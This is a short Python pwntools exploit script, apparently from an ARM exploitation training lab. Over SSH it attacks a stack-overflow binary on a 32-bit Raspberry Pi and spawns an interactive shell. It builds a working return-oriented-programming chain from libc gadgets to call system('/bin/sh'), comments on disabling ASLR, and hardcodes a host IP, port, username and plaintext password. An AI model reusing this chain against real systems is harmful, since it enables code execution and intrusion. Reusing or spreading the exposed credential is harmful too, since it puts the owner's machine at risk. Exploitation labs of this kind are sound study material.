# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

r = ssh(user="pi", host="222.111.61.64", port=56022, password="vhsjqmf1!")
p = r.process(executable="/home/pi/arm_exploitation/stack/stack7/stack7",
              cwd="/home/pi/arm_exploitation/stack/stack7/flag", env={})

 	
# Creating Payload
payload = b''
payload += cyclic(80)

LIBC_BASE = 0x76e53000
GADGET1 = LIBC_BASE + 0x00018164  # pop {r4, pc}; 
GADGET2 = LIBC_BASE + 0x0002d290  # ldr r0, [sp, #4]; blx r4;
SYSTEM = 0x76e8b9c8
BINSH = 0x76f7eb6c
EXIT = 0x76e81780

payload += p32(GADGET1) # gadget1 : pop {r4, pc}; 
payload += p32(SYSTEM)  # r4 : addr or system() 
payload += p32(GADGET2) # pc : -> gadget2 : ldr r0, [sp, #4]; blx r4;

payload += b'AAAA'      # sp[0] : dummy
payload += p32(BINSH)   # sp[4] : r0 = /bin/sh

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

p.interactive()
